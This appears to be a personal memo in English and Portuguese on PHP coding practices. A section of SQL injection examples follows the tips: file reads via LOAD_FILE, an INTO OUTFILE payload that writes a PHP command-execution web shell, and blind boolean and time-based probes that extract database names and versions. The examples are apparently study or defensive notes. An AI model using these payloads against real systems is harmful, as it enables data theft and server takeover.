1- Keep code readable and easy to search. Comment a lot and do a style guide
2- Use allways as possible single quotes.
3- Use names that make sense for Classes and Functions.
4- NEVER thrust user input - should sanitze every user input.
5- Separate the code by it's functionality ( when having thousands of lines of code, this can save a lot of time )
6- All include files should end with .php
7- Include and Require with full path (faster include)
8- Limit the use of include_once or requie_once.
9- Use static classes whenever possible.
10- On loop control, not increment Globals or object variables.
11- Define incrementation variables outside the loop
12- Use caching systems because php scripts are recompiled at every call
13- All sensitive information should be encrypted.



HACKING TYPES:
SQL Injection: Inject data, dump data, upload and execute files.
    Exemplos:
        LOAD_FILE: @url: page?id=1 union select 1, LOAD_FILE('/file_path/'),3,4 //READS FILE and returns contents as string.
        FILE_WRITE: SELECT ... INTO OUTFILE ou SELECT ... INTO DUMPFILE
        SHEL EXEC: @url: page?id=1 union select 1, "<?php system($_GET['cmd'])?>", 3 into outfile '/var/www/test.txt'

BLIND SQL Injection: A app é vulneravel a injecção mas os resultados não vão aparecer. (Ex: boolean querys)
        ?id = 2 and substring(version(),1,1) = 4 ( descobre se versão do sql = 4.x.x) ( se na der erro éporque é true )
        ?id = 2 and character_length(database()) = 2 ( descobre tamanho do nome da base de dados ) - descobrir tamanho - descobrir nome
        ?id = 2 and substring(database(),1,1) = 'a' ( verifica se a primeira letra do nome da base de dados é a) - descobrir nome
        ?id = 2 and substring(database(),2,1) = 'a' ( verifica se a segunda letra do nome da base de dados é a) - descobrir nome

TIME BASED SQL Attack: Verificando a resposta do servidor usando funções de benchmark
        ?id = 1-sleep(4) - caso carregue mais lento que o normal está alvo de ataque.
        DESCOBRINDO MYSQL V
        ?id= 1-IF(MID(VERSION(),1,1)='5',SLEEP(10),0) ->V 5.x caso demore mt a carregar
        ?id= 1-IF(MID(version(),1,1)='4',BENCHMARK(1000000000,ENCODE('CSPF','CSPF')),0) -> V4.x caso demore mt a carregar.
        DESCOBRINDO MSSQL V
        WAIT FOR DELAY 'hh:mm:ss' Exemplo: IF SYSTEM_USER= 'sa' wait for delay '00:00:10'

